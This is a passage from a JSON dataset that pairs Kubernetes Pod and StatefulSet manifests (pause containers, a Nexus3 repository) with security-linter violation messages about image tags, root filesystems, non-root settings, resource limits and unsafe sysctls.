    "violation_text": "The container \"container1\" is using an invalid container image, \"k8s.gcr.io/pause\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2153",
    "manifest_path": "data/manifests/the_stack_sample/sample_0532.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hostnamespaces1\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n  securityContext:\n    runAsNonRoot: true\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"initcontainer1\" is using an invalid container image, \"k8s.gcr.io/pause\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2154",
    "manifest_path": "data/manifests/the_stack_sample/sample_0532.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hostnamespaces1\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n  securityContext:\n    runAsNonRoot: true\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"container1\" does not have a read-only root file system"
  },
  {
    "id": "2155",
    "manifest_path": "data/manifests/the_stack_sample/sample_0532.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hostnamespaces1\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n  securityContext:\n    runAsNonRoot: true\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"initcontainer1\" does not have a read-only root file system"
  },
  {
    "id": "2156",
    "manifest_path": "data/manifests/the_stack_sample/sample_0532.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hostnamespaces1\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n  securityContext:\n    runAsNonRoot: true\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"container1\" has cpu request 0"
  },
  {
    "id": "2157",
    "manifest_path": "data/manifests/the_stack_sample/sample_0532.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hostnamespaces1\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n  securityContext:\n    runAsNonRoot: true\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"initcontainer1\" has cpu request 0"
  },
  {
    "id": "2158",
    "manifest_path": "data/manifests/the_stack_sample/sample_0532.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hostnamespaces1\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n  securityContext:\n    runAsNonRoot: true\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"container1\" has memory limit 0"
  },
  {
    "id": "2159",
    "manifest_path": "data/manifests/the_stack_sample/sample_0532.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hostnamespaces1\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n  securityContext:\n    runAsNonRoot: true\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"initcontainer1\" has memory limit 0"
  },
  {
    "id": "2160",
    "manifest_path": "data/manifests/the_stack_sample/sample_0533.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: nexus3\n  namespace: default\n  labels:\n    app: nexus3\nspec:\n  selector:\n    matchLabels:\n      app: nexus3\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nexus3\n    spec:\n      securityContext:\n        sysctls:\n        - name: net.ipv4.tcp_syncookies\n          value: '0'\n        - name: net.ipv4.ip_local_port_range\n          value: 1024 65535\n        - name: net.core.somaxconn\n          value: '65535'\n        - name: net.ipv4.ip_unprivileged_port_start\n          value: '0'\n        - name: net.ipv4.tcp_tw_reuse\n          value: '1'\n        - name: net.ipv4.tcp_fin_timeout\n          value: '30'\n        - name: net.ipv4.tcp_keepalive_intvl\n          value: '10'\n        - name: net.ipv4.tcp_keepalive_probes\n          value: '2'\n        - name: net.ipv4.tcp_keepalive_time\n          value: '120'\n        - name: net.ipv4.tcp_ecn\n          value: '1'\n        - name: net.ipv4.tcp_max_syn_backlog\n          value: '65536'\n        - name: net.ipv4.tcp_rfc1337\n          value: '1'\n        - name: net.ipv4.tcp_slow_start_after_idle\n          value: '0'\n        - name: net.ipv4.tcp_fack\n          value: '1'\n        - name: net.ipv4.tcp_max_tw_buckets\n          value: '262144'\n        - name: net.ipv4.tcp_fastopen\n          value: '3'\n        - name: net.ipv4.icmp_ratelimit\n          value: '100'\n        - name: net.ipv4.tcp_abort_on_overflow\n          value: '1'\n        - name: net.ipv4.tcp_adv_win_scale\n          value: '2'\n        - name: net.ipv4.tcp_retries2\n          value: '8'\n        - name: net.ipv4.tcp_syn_retries\n          value: '3'\n        - name: net.ipv4.tcp_synack_retries\n          value: '2'\n        - name: net.unix.max_dgram_qlen\n          value: '512'\n        - name: net.ipv4.tcp_fwmark_accept\n          value: '1'\n        - name: net.ipv4.fwmark_reflect\n          value: '1'\n      initContainers:\n      - name: volume-mount-uid\n        image: busybox\n        command:\n        - sh\n        - -c\n        - chown -R 200:200 /nexus-data\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n      containers:\n      - name: nexus3\n        image: sonatype/nexus3\n        imagePullPolicy: Always\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 60\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        resources:\n          requests:\n            cpu: 500m\n            memory: 1Gi\n          limits:\n            cpu: 8000m\n            memory: 8Gi\n        ports:\n        - name: web\n          containerPort: 8081\n        - name: docker\n          containerPort: 5003\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nexus3\" is using an invalid container image, \"sonatype/nexus3\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2161",
    "manifest_path": "data/manifests/the_stack_sample/sample_0533.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: nexus3\n  namespace: default\n  labels:\n    app: nexus3\nspec:\n  selector:\n    matchLabels:\n      app: nexus3\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nexus3\n    spec:\n      securityContext:\n        sysctls:\n        - name: net.ipv4.tcp_syncookies\n          value: '0'\n        - name: net.ipv4.ip_local_port_range\n          value: 1024 65535\n        - name: net.core.somaxconn\n          value: '65535'\n        - name: net.ipv4.ip_unprivileged_port_start\n          value: '0'\n        - name: net.ipv4.tcp_tw_reuse\n          value: '1'\n        - name: net.ipv4.tcp_fin_timeout\n          value: '30'\n        - name: net.ipv4.tcp_keepalive_intvl\n          value: '10'\n        - name: net.ipv4.tcp_keepalive_probes\n          value: '2'\n        - name: net.ipv4.tcp_keepalive_time\n          value: '120'\n        - name: net.ipv4.tcp_ecn\n          value: '1'\n        - name: net.ipv4.tcp_max_syn_backlog\n          value: '65536'\n        - name: net.ipv4.tcp_rfc1337\n          value: '1'\n        - name: net.ipv4.tcp_slow_start_after_idle\n          value: '0'\n        - name: net.ipv4.tcp_fack\n          value: '1'\n        - name: net.ipv4.tcp_max_tw_buckets\n          value: '262144'\n        - name: net.ipv4.tcp_fastopen\n          value: '3'\n        - name: net.ipv4.icmp_ratelimit\n          value: '100'\n        - name: net.ipv4.tcp_abort_on_overflow\n          value: '1'\n        - name: net.ipv4.tcp_adv_win_scale\n          value: '2'\n        - name: net.ipv4.tcp_retries2\n          value: '8'\n        - name: net.ipv4.tcp_syn_retries\n          value: '3'\n        - name: net.ipv4.tcp_synack_retries\n          value: '2'\n        - name: net.unix.max_dgram_qlen\n          value: '512'\n        - name: net.ipv4.tcp_fwmark_accept\n          value: '1'\n        - name: net.ipv4.fwmark_reflect\n          value: '1'\n      initContainers:\n      - name: volume-mount-uid\n        image: busybox\n        command:\n        - sh\n        - -c\n        - chown -R 200:200 /nexus-data\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n      containers:\n      - name: nexus3\n        image: sonatype/nexus3\n        imagePullPolicy: Always\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 60\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        resources:\n          requests:\n            cpu: 500m\n            memory: 1Gi\n          limits:\n            cpu: 8000m\n            memory: 8Gi\n        ports:\n        - name: web\n          containerPort: 8081\n        - name: docker\n          containerPort: 5003\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"volume-mount-uid\" is using an invalid container image, \"busybox\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2162",
    "manifest_path": "data/manifests/the_stack_sample/sample_0533.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: nexus3\n  namespace: default\n  labels:\n    app: nexus3\nspec:\n  selector:\n    matchLabels:\n      app: nexus3\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nexus3\n    spec:\n      securityContext:\n        sysctls:\n        - name: net.ipv4.tcp_syncookies\n          value: '0'\n        - name: net.ipv4.ip_local_port_range\n          value: 1024 65535\n        - name: net.core.somaxconn\n          value: '65535'\n        - name: net.ipv4.ip_unprivileged_port_start\n          value: '0'\n        - name: net.ipv4.tcp_tw_reuse\n          value: '1'\n        - name: net.ipv4.tcp_fin_timeout\n          value: '30'\n        - name: net.ipv4.tcp_keepalive_intvl\n          value: '10'\n        - name: net.ipv4.tcp_keepalive_probes\n          value: '2'\n        - name: net.ipv4.tcp_keepalive_time\n          value: '120'\n        - name: net.ipv4.tcp_ecn\n          value: '1'\n        - name: net.ipv4.tcp_max_syn_backlog\n          value: '65536'\n        - name: net.ipv4.tcp_rfc1337\n          value: '1'\n        - name: net.ipv4.tcp_slow_start_after_idle\n          value: '0'\n        - name: net.ipv4.tcp_fack\n          value: '1'\n        - name: net.ipv4.tcp_max_tw_buckets\n          value: '262144'\n        - name: net.ipv4.tcp_fastopen\n          value: '3'\n        - name: net.ipv4.icmp_ratelimit\n          value: '100'\n        - name: net.ipv4.tcp_abort_on_overflow\n          value: '1'\n        - name: net.ipv4.tcp_adv_win_scale\n          value: '2'\n        - name: net.ipv4.tcp_retries2\n          value: '8'\n        - name: net.ipv4.tcp_syn_retries\n          value: '3'\n        - name: net.ipv4.tcp_synack_retries\n          value: '2'\n        - name: net.unix.max_dgram_qlen\n          value: '512'\n        - name: net.ipv4.tcp_fwmark_accept\n          value: '1'\n        - name: net.ipv4.fwmark_reflect\n          value: '1'\n      initContainers:\n      - name: volume-mount-uid\n        image: busybox\n        command:\n        - sh\n        - -c\n        - chown -R 200:200 /nexus-data\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n      containers:\n      - name: nexus3\n        image: sonatype/nexus3\n        imagePullPolicy: Always\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 60\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        resources:\n          requests:\n            cpu: 500m\n            memory: 1Gi\n          limits:\n            cpu: 8000m\n            memory: 8Gi\n        ports:\n        - name: web\n          containerPort: 8081\n        - name: docker\n          containerPort: 5003\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nexus3\" does not have a read-only root file system"
  },
  {
    "id": "2163",
    "manifest_path": "data/manifests/the_stack_sample/sample_0533.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: nexus3\n  namespace: default\n  labels:\n    app: nexus3\nspec:\n  selector:\n    matchLabels:\n      app: nexus3\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nexus3\n    spec:\n      securityContext:\n        sysctls:\n        - name: net.ipv4.tcp_syncookies\n          value: '0'\n        - name: net.ipv4.ip_local_port_range\n          value: 1024 65535\n        - name: net.core.somaxconn\n          value: '65535'\n        - name: net.ipv4.ip_unprivileged_port_start\n          value: '0'\n        - name: net.ipv4.tcp_tw_reuse\n          value: '1'\n        - name: net.ipv4.tcp_fin_timeout\n          value: '30'\n        - name: net.ipv4.tcp_keepalive_intvl\n          value: '10'\n        - name: net.ipv4.tcp_keepalive_probes\n          value: '2'\n        - name: net.ipv4.tcp_keepalive_time\n          value: '120'\n        - name: net.ipv4.tcp_ecn\n          value: '1'\n        - name: net.ipv4.tcp_max_syn_backlog\n          value: '65536'\n        - name: net.ipv4.tcp_rfc1337\n          value: '1'\n        - name: net.ipv4.tcp_slow_start_after_idle\n          value: '0'\n        - name: net.ipv4.tcp_fack\n          value: '1'\n        - name: net.ipv4.tcp_max_tw_buckets\n          value: '262144'\n        - name: net.ipv4.tcp_fastopen\n          value: '3'\n        - name: net.ipv4.icmp_ratelimit\n          value: '100'\n        - name: net.ipv4.tcp_abort_on_overflow\n          value: '1'\n        - name: net.ipv4.tcp_adv_win_scale\n          value: '2'\n        - name: net.ipv4.tcp_retries2\n          value: '8'\n        - name: net.ipv4.tcp_syn_retries\n          value: '3'\n        - name: net.ipv4.tcp_synack_retries\n          value: '2'\n        - name: net.unix.max_dgram_qlen\n          value: '512'\n        - name: net.ipv4.tcp_fwmark_accept\n          value: '1'\n        - name: net.ipv4.fwmark_reflect\n          value: '1'\n      initContainers:\n      - name: volume-mount-uid\n        image: busybox\n        command:\n        - sh\n        - -c\n        - chown -R 200:200 /nexus-data\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n      containers:\n      - name: nexus3\n        image: sonatype/nexus3\n        imagePullPolicy: Always\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 60\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        resources:\n          requests:\n            cpu: 500m\n            memory: 1Gi\n          limits:\n            cpu: 8000m\n            memory: 8Gi\n        ports:\n        - name: web\n          containerPort: 8081\n        - name: docker\n          containerPort: 5003\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"volume-mount-uid\" does not have a read-only root file system"
  },
  {
    "id": "2164",
    "manifest_path": "data/manifests/the_stack_sample/sample_0533.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: nexus3\n  namespace: default\n  labels:\n    app: nexus3\nspec:\n  selector:\n    matchLabels:\n      app: nexus3\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nexus3\n    spec:\n      securityContext:\n        sysctls:\n        - name: net.ipv4.tcp_syncookies\n          value: '0'\n        - name: net.ipv4.ip_local_port_range\n          value: 1024 65535\n        - name: net.core.somaxconn\n          value: '65535'\n        - name: net.ipv4.ip_unprivileged_port_start\n          value: '0'\n        - name: net.ipv4.tcp_tw_reuse\n          value: '1'\n        - name: net.ipv4.tcp_fin_timeout\n          value: '30'\n        - name: net.ipv4.tcp_keepalive_intvl\n          value: '10'\n        - name: net.ipv4.tcp_keepalive_probes\n          value: '2'\n        - name: net.ipv4.tcp_keepalive_time\n          value: '120'\n        - name: net.ipv4.tcp_ecn\n          value: '1'\n        - name: net.ipv4.tcp_max_syn_backlog\n          value: '65536'\n        - name: net.ipv4.tcp_rfc1337\n          value: '1'\n        - name: net.ipv4.tcp_slow_start_after_idle\n          value: '0'\n        - name: net.ipv4.tcp_fack\n          value: '1'\n        - name: net.ipv4.tcp_max_tw_buckets\n          value: '262144'\n        - name: net.ipv4.tcp_fastopen\n          value: '3'\n        - name: net.ipv4.icmp_ratelimit\n          value: '100'\n        - name: net.ipv4.tcp_abort_on_overflow\n          value: '1'\n        - name: net.ipv4.tcp_adv_win_scale\n          value: '2'\n        - name: net.ipv4.tcp_retries2\n          value: '8'\n        - name: net.ipv4.tcp_syn_retries\n          value: '3'\n        - name: net.ipv4.tcp_synack_retries\n          value: '2'\n        - name: net.unix.max_dgram_qlen\n          value: '512'\n        - name: net.ipv4.tcp_fwmark_accept\n          value: '1'\n        - name: net.ipv4.fwmark_reflect\n          value: '1'\n      initContainers:\n      - name: volume-mount-uid\n        image: busybox\n        command:\n        - sh\n        - -c\n        - chown -R 200:200 /nexus-data\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n      containers:\n      - name: nexus3\n        image: sonatype/nexus3\n        imagePullPolicy: Always\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 60\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        resources:\n          requests:\n            cpu: 500m\n            memory: 1Gi\n          limits:\n            cpu: 8000m\n            memory: 8Gi\n        ports:\n        - name: web\n          containerPort: 8081\n        - name: docker\n          containerPort: 5003\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nexus3\" is not set to runAsNonRoot"
  },
  {
    "id": "2165",
    "manifest_path": "data/manifests/the_stack_sample/sample_0533.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: nexus3\n  namespace: default\n  labels:\n    app: nexus3\nspec:\n  selector:\n    matchLabels:\n      app: nexus3\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nexus3\n    spec:\n      securityContext:\n        sysctls:\n        - name: net.ipv4.tcp_syncookies\n          value: '0'\n        - name: net.ipv4.ip_local_port_range\n          value: 1024 65535\n        - name: net.core.somaxconn\n          value: '65535'\n        - name: net.ipv4.ip_unprivileged_port_start\n          value: '0'\n        - name: net.ipv4.tcp_tw_reuse\n          value: '1'\n        - name: net.ipv4.tcp_fin_timeout\n          value: '30'\n        - name: net.ipv4.tcp_keepalive_intvl\n          value: '10'\n        - name: net.ipv4.tcp_keepalive_probes\n          value: '2'\n        - name: net.ipv4.tcp_keepalive_time\n          value: '120'\n        - name: net.ipv4.tcp_ecn\n          value: '1'\n        - name: net.ipv4.tcp_max_syn_backlog\n          value: '65536'\n        - name: net.ipv4.tcp_rfc1337\n          value: '1'\n        - name: net.ipv4.tcp_slow_start_after_idle\n          value: '0'\n        - name: net.ipv4.tcp_fack\n          value: '1'\n        - name: net.ipv4.tcp_max_tw_buckets\n          value: '262144'\n        - name: net.ipv4.tcp_fastopen\n          value: '3'\n        - name: net.ipv4.icmp_ratelimit\n          value: '100'\n        - name: net.ipv4.tcp_abort_on_overflow\n          value: '1'\n        - name: net.ipv4.tcp_adv_win_scale\n          value: '2'\n        - name: net.ipv4.tcp_retries2\n          value: '8'\n        - name: net.ipv4.tcp_syn_retries\n          value: '3'\n        - name: net.ipv4.tcp_synack_retries\n          value: '2'\n        - name: net.unix.max_dgram_qlen\n          value: '512'\n        - name: net.ipv4.tcp_fwmark_accept\n          value: '1'\n        - name: net.ipv4.fwmark_reflect\n          value: '1'\n      initContainers:\n      - name: volume-mount-uid\n        image: busybox\n        command:\n        - sh\n        - -c\n        - chown -R 200:200 /nexus-data\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n      containers:\n      - name: nexus3\n        image: sonatype/nexus3\n        imagePullPolicy: Always\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 60\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        resources:\n          requests:\n            cpu: 500m\n            memory: 1Gi\n          limits:\n            cpu: 8000m\n            memory: 8Gi\n        ports:\n        - name: web\n          containerPort: 8081\n        - name: docker\n          containerPort: 5003\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"volume-mount-uid\" is not set to runAsNonRoot"
  },
  {
    "id": "2166",
    "manifest_path": "data/manifests/the_stack_sample/sample_0533.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: nexus3\n  namespace: default\n  labels:\n    app: nexus3\nspec:\n  selector:\n    matchLabels:\n      app: nexus3\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nexus3\n    spec:\n      securityContext:\n        sysctls:\n        - name: net.ipv4.tcp_syncookies\n          value: '0'\n        - name: net.ipv4.ip_local_port_range\n          value: 1024 65535\n        - name: net.core.somaxconn\n          value: '65535'\n        - name: net.ipv4.ip_unprivileged_port_start\n          value: '0'\n        - name: net.ipv4.tcp_tw_reuse\n          value: '1'\n        - name: net.ipv4.tcp_fin_timeout\n          value: '30'\n        - name: net.ipv4.tcp_keepalive_intvl\n          value: '10'\n        - name: net.ipv4.tcp_keepalive_probes\n          value: '2'\n        - name: net.ipv4.tcp_keepalive_time\n          value: '120'\n        - name: net.ipv4.tcp_ecn\n          value: '1'\n        - name: net.ipv4.tcp_max_syn_backlog\n          value: '65536'\n        - name: net.ipv4.tcp_rfc1337\n          value: '1'\n        - name: net.ipv4.tcp_slow_start_after_idle\n          value: '0'\n        - name: net.ipv4.tcp_fack\n          value: '1'\n        - name: net.ipv4.tcp_max_tw_buckets\n          value: '262144'\n        - name: net.ipv4.tcp_fastopen\n          value: '3'\n        - name: net.ipv4.icmp_ratelimit\n          value: '100'\n        - name: net.ipv4.tcp_abort_on_overflow\n          value: '1'\n        - name: net.ipv4.tcp_adv_win_scale\n          value: '2'\n        - name: net.ipv4.tcp_retries2\n          value: '8'\n        - name: net.ipv4.tcp_syn_retries\n          value: '3'\n        - name: net.ipv4.tcp_synack_retries\n          value: '2'\n        - name: net.unix.max_dgram_qlen\n          value: '512'\n        - name: net.ipv4.tcp_fwmark_accept\n          value: '1'\n        - name: net.ipv4.fwmark_reflect\n          value: '1'\n      initContainers:\n      - name: volume-mount-uid\n        image: busybox\n        command:\n        - sh\n        - -c\n        - chown -R 200:200 /nexus-data\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n      containers:\n      - name: nexus3\n        image: sonatype/nexus3\n        imagePullPolicy: Always\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 60\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        resources:\n          requests:\n            cpu: 500m\n            memory: 1Gi\n          limits:\n            cpu: 8000m\n            memory: 8Gi\n        ports:\n        - name: web\n          containerPort: 8081\n        - name: docker\n          containerPort: 5003\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n",
    "policy_id": "unsafe-sysctls",
    "violation_text": "resource specifies unsafe sysctl \"net.core.somaxconn\"."
  },
  {
    "id": "2167",
    "manifest_path": "data/manifests/the_stack_sample/sample_0533.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: nexus3\n  namespace: default\n  labels:\n    app: nexus3\nspec:\n  selector:\n    matchLabels:\n      app: nexus3\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nexus3\n    spec:\n      securityContext:\n        sysctls:\n        - name: net.ipv4.tcp_syncookies\n          value: '0'\n        - name: net.ipv4.ip_local_port_range\n          value: 1024 65535\n        - name: net.core.somaxconn\n          value: '65535'\n        - name: net.ipv4.ip_unprivileged_port_start\n          value: '0'\n        - name: net.ipv4.tcp_tw_reuse\n          value: '1'\n        - name: net.ipv4.tcp_fin_timeout\n          value: '30'\n        - name: net.ipv4.tcp_keepalive_intvl\n          value: '10'\n        - name: net.ipv4.tcp_keepalive_probes\n          value: '2'\n        - name: net.ipv4.tcp_keepalive_time\n          value: '120'\n        - name: net.ipv4.tcp_ecn\n          value: '1'\n        - name: net.ipv4.tcp_max_syn_backlog\n          value: '65536'\n        - name: net.ipv4.tcp_rfc1337\n          value: '1'\n        - name: net.ipv4.tcp_slow_start_after_idle\n          value: '0'\n        - name: net.ipv4.tcp_fack\n          value: '1'\n        - name: net.ipv4.tcp_max_tw_buckets\n          value: '262144'\n        - name: net.ipv4.tcp_fastopen\n          value: '3'\n        - name: net.ipv4.icmp_ratelimit\n          value: '100'\n        - name: net.ipv4.tcp_abort_on_overflow\n          value: '1'\n        - name: net.ipv4.tcp_adv_win_scale\n          value: '2'\n        - name: net.ipv4.tcp_retries2\n          value: '8'\n        - name: net.ipv4.tcp_syn_retries\n          value: '3'\n        - name: net.ipv4.tcp_synack_retries\n          value: '2'\n        - name: net.unix.max_dgram_qlen\n          value: '512'\n        - name: net.ipv4.tcp_fwmark_accept\n          value: '1'\n        - name: net.ipv4.fwmark_reflect\n          value: '1'\n      initContainers:\n      - name: volume-mount-uid\n        image: busybox\n        command:\n        - sh\n        - -c\n        - chown -R 200:200 /nexus-data\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n      containers:\n      - name: nexus3\n        image: sonatype/nexus3\n        imagePullPolicy: Always\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 60\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        resources:\n          requests:\n            cpu: 500m\n            memory: 1Gi\n          limits:\n            cpu: 8000m\n            memory: 8Gi\n        ports:\n        - name: web\n          containerPort: 8081\n        - name: docker\n          containerPort: 5003\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n",
    "policy_id": "unsafe-sysctls",
    "violation_text": "resource specifies unsafe sysctl \"net.ipv4.fwmark_reflect\"."
  },
  {
    "id": "2168",
    "manifest_path": "data/manifests/the_stack_sample/sample_0533.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: nexus3\n  namespace: default\n  labels:\n    app: nexus3\nspec:\n  selector:\n    matchLabels:\n      app: nexus3\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nexus3\n    spec:\n      securityContext:\n        sysctls:\n        - name: net.ipv4.tcp_syncookies\n          value: '0'\n        - name: net.ipv4.ip_local_port_range\n          value: 1024 65535\n        - name: net.core.somaxconn\n          value: '65535'\n        - name: net.ipv4.ip_unprivileged_port_start\n          value: '0'\n        - name: net.ipv4.tcp_tw_reuse\n          value: '1'\n        - name: net.ipv4.tcp_fin_timeout\n          value: '30'\n        - name: net.ipv4.tcp_keepalive_intvl\n          value: '10'\n        - name: net.ipv4.tcp_keepalive_probes\n          value: '2'\n        - name: net.ipv4.tcp_keepalive_time\n          value: '120'\n        - name: net.ipv4.tcp_ecn\n          value: '1'\n        - name: net.ipv4.tcp_max_syn_backlog\n          value: '65536'\n        - name: net.ipv4.tcp_rfc1337\n          value: '1'\n        - name: net.ipv4.tcp_slow_start_after_idle\n          value: '0'\n        - name: net.ipv4.tcp_fack\n          